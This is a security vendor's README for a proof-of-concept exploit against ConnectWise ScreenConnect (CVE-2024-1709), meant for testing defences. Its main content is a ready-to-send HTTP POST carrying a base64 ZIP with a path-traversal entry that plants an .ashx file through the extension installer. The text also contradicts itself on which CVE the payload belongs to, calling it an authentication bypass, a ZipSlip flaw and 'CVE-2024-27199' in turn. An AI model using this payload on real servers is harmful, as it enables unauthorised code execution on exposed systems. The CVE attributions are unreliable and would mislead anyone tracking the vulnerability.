# ConnectWise ScreenConnect CVE-2024-1709 PoC Exploit
ConnectWise released a security fix for all on-premise versions of ScreenConnect to address a critical authentication bypass vulnerability.<br><br>
In this repo, Picus provides a Proof-of-Concept exploit for the CVE-2024-1709 vulnerability.

Test security controls against the CVE-2024-1709 vulnerability exploit 
--------------------------------------
Picus can help you simulate the CVE-2024-1709 vulnerability exploits for free. No setup or signup is required.<br>
Use [Picus Emerging Threat Simulator](https://insights.picussecurity.com/emerging-threat-simulator-announcement?utm_source=github&utm_medium=organic+social&utm_campaign=PLS+Offensive+-+ET+Simulator) and test your defenses in a few clicks.<br> 

If you are looking for more detailed information, check out our blog post: [CVE-2024-1709 & CVE-2024-1708: ConnectWise ScreenConnect Vulnerability Exploitations](https://www.picussecurity.com/resource/blog/cve-2024-1709-cve-2024-1708-connectwise-screenconnect-vulnerability-exploitations)


CVE-2024-1709 Proof-of-concept (POC)
----------------------
CVE-2024-1709 vulnerability is caused by inadequate path validation when ScreenConnect extracts files from ZIP archives, specifically in the context of handling ScreenConnect extensions. The original code (before the patch) did not strictly validate or sanitize the paths of extracted files, potentially allowing a malicious zip file to traverse directories (ZipSlip) and place files outside the intended target directory.

The example HTTP POST request below exploits the CVE-2024-1709 vulnerability to bypass authentication.

#### Example CVE-2024-27199 Exploit:
```http
POST /Services/ExtensionService.ashx/InstallExtension HTTP/1.1
Content-Type: application/json
Content-Length: 1524

["UEsDBBQAAAAIAEGCWliKbA3ZpAAAAAIBAAAxAAAAMzk3Y2U1ZWYtMTY0YS00NmZhLWE3YmQtZTZjMjk5NDE3NjYzL01hbmlmZXN0LnhtbGWPzQ6CMBCE7zxF07tUbx4Kxvhz04MkesY6SBNoSbsQHt8WNDHhtLNfZiezcje2DRvgvLYm45t0zRmMsi9t3hnvqVpt+S5P5GkkmOi5lEZX8JQnjMn7fJdL8VORXssWAU0j7vueausC+YrIiiDoCK+c7miOWKDoO9i2swaGfFwDeOBZwA1a4YYKLnQFK2zvFM66QcYpdEtLX49cTAHiP0GK5R8fUEsDBBQAAAAIAEGCWlhVTHwwXgIAABEFAAAxAAAAMzk3Y2U1ZWYtMTY0YS00NmZhLWE3YmQtZTZjMjk5NDE3NjYzLy4uL3Rlc3QuYXNoeIVUTU/jMBC951eMskJNQXLulFaLul3oBXZbKs5OMrSW/BHsMVAh/vuOm1AoWpVLkvE8v3njeQ5kFyfwE56x2kjbaPSgpV1HucZxPv2RQ61lCOP88gk9r113mBxOJlkWg7JrWG4DoRkdROIeqy8rv5RcWxdI1eFLZn47yrI2VlrVXTU4LAbnML8mavswe80AylMQN0jg8TEqjwFoo/jhoEJQptVo0BI2cFoyuOeunNMwDwuMQVYaOZGYANbM88pMFL0F8hFH8MaJt6yrY6SygC9YR0qia9fgAe2TUw388a7GwNyPEQMVSe7UsYIXgppehvtaK68geg1jsPicos9QMY3es27R04iV12JZb7gZOIP8vCxzfgN8t+Uy0sZ5RVtGH8Mu5DPDh6OdskC+a88YPmcWmHauSGnmEX+kD/g3ot8ud7CCexC7eCiukIq8Nk3ORDsmbphLhNbZgOKedWCRXzw4b8AgC2vGg6vZ3WAy7Sqdw4WybSSw0uB4wEQDeJI68nd+1qs5yweTHkXbljMhVkbRHriIlgFlqjHJ+37+q2Ljj+dbj5N9Hzz799Pox+8spMhFSlLYMV4hS+jsAO8mWJL0NLcPDtqg+kl/TRW9CkaI30rjDTfP0HSOgovlH9lLv47JzCGlyxr2h/IBWWDDd6AmZreN9M1tp2/cmXkPWwVcblDr2a6ZVO5B6tADeoHQ8nL/LXZqC97ai+XZozQLlA1fykDGN57RrTise2CnpLpDirTvzs1sU+wdt1ufahewOGKej1+K+OzJazJ6ZtN1LMLw2FDL96l+a4u3jC/9P1BLAQIUAxQAAAAIAEGCWliKbA3ZpAAAAAIBAAAxAAAAAAAAAAAAAACAAQAAAAAzOTdjZTVlZi0xNjRhLTQ2ZmEtYTdiZC1lNmMyOTk0MTc2NjMvTWFuaWZlc3QueG1sUEsBAhQDFAAAAAgAQYJaWFVMfDBeAgAAEQUAADEAAAAAAAAAAAAAAIAB8wAAADM5N2NlNWVmLTE2NGEtNDZmYS1hN2JkLWU2YzI5OTQxNzY2My8uLi90ZXN0LmFzaHhQSwUGAAAAAAIAAgC+AAAAoAMAAAAA"]
```

Disclaimer
----------
Â©2024 Picus Security <br>
All rights reserved.
